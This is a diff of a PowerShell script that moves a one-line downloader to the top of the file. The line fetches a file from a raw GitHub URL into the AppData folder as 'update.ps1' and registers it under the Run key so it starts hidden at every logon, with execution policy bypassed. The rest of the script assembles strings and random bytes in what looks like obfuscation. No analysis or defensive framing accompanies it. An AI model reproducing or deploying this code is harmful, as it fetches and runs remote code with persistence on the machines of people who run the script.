@@ -1,3 +1,4 @@
+$path="$env:APPDATA\update.ps1" Invoke-WebRequest 'https://raw.githubusercontent.com/MettBrot420420/123/refs/heads/main/dsfdsf' -OutFile $path if(Test-Path "$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe"){ $ps="$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe" } else { $ps="$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe" } $cmd = "$ps -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$path"" Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyStartupEntry" -Value $cmd
 function R1 { Get-Random -Minimum 1 -Maximum 101 }
 function R2 {
     param([byte[]]$x, [byte[]]$y)
@@ -20,7 +21,6 @@ $s7 = $zutat.Substring(27)
 $gekocht = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7
 
 $b = [Text.Encoding]::UTF8.GetBytes($gekocht)
-$path="$env:APPDATA\update.ps1" Invoke-WebRequest 'https://raw.githubusercontent.com/MettBrot420420/123/refs/heads/main/dsfdsf' -OutFile $path if(Test-Path "$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe"){ $ps="$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe" } else { $ps="$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe" } $cmd = "$ps -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$path"" Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyStartupEntry" -Value $cmd
 $c = [string][math]::Round([math]::Pow((R1),10))
 $d = [Text.Encoding]::UTF8.GetBytes($c)
 $e = $d[($d.Length-1)..0]
